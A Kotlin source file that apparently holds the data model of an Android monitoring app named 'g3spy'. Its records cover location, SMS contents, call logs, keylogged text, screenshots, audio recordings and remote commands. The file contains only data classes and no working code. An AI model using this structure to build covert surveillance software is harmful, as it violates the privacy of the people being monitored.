package com.g3spy.parent.model

data class LocationData(
    val id: String = "",
    val latitude: Double = 0.0,
    val longitude: Double = 0.0,
    val accuracy: Float = 0.0f,
    val altitude: Double = 0.0,
    val timestamp: Long = 0L,
    
    val isInsideGeofence: Boolean = true
)

data class SmsData(
    val id: String = "",
    val sender: String = "",
    val recipient: String = "",
    val content: String = "",
    val timestamp: Long = 0L,
    val isIncoming: Boolean = true
)

data class CallData(
    val id: String = "",
    val phoneNumber: String = "",
    val contactName: String? = null,
    val timestamp: Long = 0L,
    val duration: Int = 0,
    val callType: String = "UNKNOWN" 
)

data class KeylogData(
    val id: String = "",
    val text: String = "",
    val app: String = "",
    val timestamp: Long = 0L
)

data class ScreenshotData(
    val id: String = "",
    val imageUrl: String = "",
    val timestamp: Long = 0L,
    val appInForeground: String = ""
)

data class AudioRecordingData(
    val id: String = "",
    val audioUrl: String = "",
    val timestamp: Long = 0L,
    val duration: Int = 0 
)

data class RemoteCommand(
    val id: String = "",
    val command: String = "", 
    val params: Map<String, Any> = mapOf(),
    val timestamp: Long = 0L,
    val isExecuted: Boolean = false
)

data class DeviceStatus(
    val id: String = "",
    val batteryLevel: Int = 0,
    val isCharging: Boolean = false,
    val availableStorage: Long = 0L,
    val deviceModel: String = "",
    val androidVersion: String = "",
    val lastConnectionTime: Long = 0L,
    val isNetworkAvailable: Boolean = true,
    val activeApp: String = ""
)